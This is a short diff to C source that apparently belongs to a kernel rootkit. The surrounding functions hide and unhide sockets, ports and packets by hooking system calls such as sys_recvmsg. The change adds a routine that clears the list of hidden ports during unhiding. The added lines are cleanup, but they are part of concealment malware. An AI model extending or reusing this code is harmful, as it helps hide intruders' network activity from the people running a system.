@@ -96,6 +96,7 @@ unhide_sockets(void)
         sys_recvmsg = NULL;
 
         unhide_packets();
+        clear_hidden_ports();
         clear_hidden_lports();
     }
 }
@@ -116,6 +117,13 @@ unhide_port(port_t port, proto_t proto)
 
     if (proto == tcp4 || proto == tcp6)
         unhide_lport(port);
+}
+
+void
+clear_hidden_ports(void)
+{
+    i = hidden_ports_tail;
+    while ((i = remove_port_from_list(i, i->port, i->proto)));
 }
 
 bool
